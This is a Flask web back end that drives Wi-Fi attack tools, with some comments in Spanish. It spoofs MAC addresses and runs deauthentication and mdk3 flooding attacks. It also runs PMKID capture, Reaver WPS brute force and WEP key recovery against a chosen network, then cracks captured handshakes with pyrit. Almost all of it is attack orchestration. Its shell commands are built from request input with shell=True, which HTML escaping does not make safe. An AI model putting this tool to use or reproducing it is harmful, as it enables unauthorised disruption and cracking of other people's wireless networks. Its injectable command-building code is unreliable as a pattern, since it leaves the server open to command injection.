import threading
import subprocess
from markupsafe import escape
from flask import request, session
from app import app, config
from werkzeug.utils import secure_filename

scanning = False
scanAttack = False

from app.utils import *


@app.get('/')
def index():
    path = config['server']['filePath']
    session["path"] = path
    mkdir = f'mkdir {path}'
    subprocess.run(mkdir, check=True, shell=True, capture_output=True)
    return ret({"status":"OK"})

@app.get('/netcard')
def getNetcardMon():
    listNetcards = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
    output = subprocess.run(listNetcards, check=True, shell=True, capture_output=True)
    
    return ret({"cards": f"{output.stdout.decode()}"})

@app.post('/netcard')
def setNetcardMon():
    netcard = escape(request.form['netcard'])
    netcardMon = netcard + "mon"
    session["netcardMon"] = netcardMon
    mac = f"{config['mac']['oui']}:12:8c:b6"
    session["mac"] = mac
    scanning = False

    startMon = f'airmon-ng check kill && airmon-ng start {netcard}'
    subprocess.run(startMon, check=True, shell=True)

    changeMac = f'ifconfig {netcardMon} down &&  macchanger --mac={mac} {netcardMon} && ifconfig {netcardMon} up'
    subprocess.run(changeMac, check=True, shell=True)
    
    return  ret({"netcard": f"{netcardMon}", "mac": f"{mac}"})

@app.get('/stop')
def stopNetcardMon():
    scanning = False
    scanAttack = False
    netcardMon = session.get("netcardMon") 
    path = config['server']['filePath']

    stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
    subprocess.run(stopServices, check=True, shell=True)

    #clean(path)
    #clean(path, True)

    return ret({"status":"OK"})

@app.get('/scan')
def scan():
    netcardMon = session.get('netcardMon') 
    path = session.get('path')

    startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon} > /dev/null'
    subprocess.Popen(startScan, shell=True)

    scanning = True
    threading.Thread(target=readScan).start()
           
    return ret({"status":"OK"})


@app.post('/target')
def target():
    session['bssid'] = escape(request.form['bssid'])
    session['essid'] = escape(request.form['essid'])
    session['channel'] = escape(request.form['channel'])
    #TODO: Plantear target... aislado o conjunto??
    return ret({"status":"OK"})

@app.post('/attack/<int:id>')
def attack(id):
    nPackets = escape(request.form['n'])
    netcardMon = session.get('netcardMon')
    bssid = session.get('bssid')
    essid = session.get('essid')
    channel = session.get('channel')
    path = session.get('path')
    mac = session.get('mac')
    scanAttack = True

    
    startScan = f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} {netcardMon} > {path}/tempScan'
    subprocess.Popen(startScan, shell=True)

    sleep(3)

    match id:
        #WPA/WPA2 With Clients
        case 0: #Deauthentication
            attack = f'aireplay-ng -0 {nPackets} -a {bssid} {netcardMon}'
            pass
        case 1: #Fake DoS Attack
            attack = f'mdk3 a -a {bssid} {netcardMon}'
            pass
        case 2: #Beacon Flood Mode Attack
            fakeNets = escape(request.form['fn'])
            attack = f'mdk3 b -f {fakeNets} -a -s 1000 -c {channel} {netcardMon}'
            pass
        case 3: #Disassociation Amok Mode Attack
            attack = f'mdk3 d -w blacklist -c 1 {netcardMon}'
            pass
        case 4: #Michael Shutdown Explotation
            attack = f'mdk3 m -t {bssid} {netcardMon}'
            pass

        #WPA/WPA2 Without Clients
        case 5: #PMKID
            attack = f'hcxdumptool -i {netcardMon} -o captura --enable_status=1'
            extract = f'hcxpcaptool -z hashes captura'
            pass

        #WPS
        case 6: #Reaver Pin Attack
            attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && reaver -i {netcardMon} -b {bssid} -c {channel} -N -L'
            pass

        #WEP 
        case 7: #Fake Authentication Attack
            attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -2 -p 0841 -b {bssid} -h {mac} {netcardMon}'
            extract = f'aircrack-ng -b {bssid} {path}/dumpDataAttack-01.cap'
            pass
        case 8: #Fake Authentication Attack + Chopchop
            attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -4 -b {bssid} -h {mac} {netcardMon}'
            packetforge = f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 -l 255.255.255.255 -y {path}/xor -w {path}/pf'
            extract = f'aireplay-ng -2 -r {path}/pf {netcardMon} && aircrack-ng {path}/dumpDataAttack-01.cap'
            pass
        case 9: #Fake Authentication Attack + Fragmentation
            attack = f'aireplay-ng -1 0 -e {essid} -a {bssid} -h {mac} {netcardMon} && aireplay-ng -5 -b {bssid} -h {mac} {netcardMon}'
            packetforge = f'packetforge-ng -0 -a {bssid} -h {mac} -k 255.255.255.255 -l 255.255.255.255 -y {path}/xor -w {path}/pf'
            extract = f'aireplay-ng -2 -r {path}/pf {netcardMon} && aircrack-ng {path}/dumpDataAttack-01.cap'
            pass

    subprocess.run(attack, check=True, shell=True)
    
    waitHandshake()
    
    #Finish scan
    stopNetcardMon()

    #Comprobar handshake
    checkHandshake = subprocess.run(f'pyrit -r {path}/dumpDataAttack-01.cap analyze', check=True, shell=True)
    
    #1 -> HS no valido ; 0 -> HS valido
    if checkHandshake.returncode == 1:
        return ret({"status":"HS not captured"}, 400)

    return ret({"status":"OK"})

###Cracking

##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
@app.get('/crack/<string:wordlist>')
def cracker(wordlist):
    path = session.get('path')
    essid = session.get('essid')
    wordlist = escape(wordlist)
    #Define DB
    defineDB = f'pyrit -i wordlist/{wordlist} import_passwords'
    subprocess.run(defineDB, check=True, shell=True)

    #Define ESSID
    defineDB = f'pyrit -e {essid} create_essid'
    subprocess.run(defineDB, check=True, shell=True)

    #Generate PMKs
    generatePMKS = 'pyrit batch'
    subprocess.run(generatePMKS, check=True, shell=True)

    #Start cracking
    startCrack =  f'pyrit -r {path}/dumpDataAttack-01.cap attack_db > passDB/{essid}'
    subprocess.run(startCrack, check=True, shell=True)

    return ret({"status":"OK"})


###Uploads

##Upload wordlists or fakeNetworks
@app.post('/list/<string:list>')
def setWordlist(list):
    list = escape(list)
    f = request.files['file']
    f.save(f'{list}/{secure_filename(f.filename)}')
    
    return ret({"status":f"saved on {list}/{secure_filename(f.filename)}"})

@app.get('/list/<string:list>')
def getWordlists(list):
    list = escape(list)
    ls = f'ls {list}'
    output = subprocess.run(ls, check=True, capture_output=True, text=True, shell=True)
    
    ls = output.stdout

    return ret({"ls": f"{ls}"})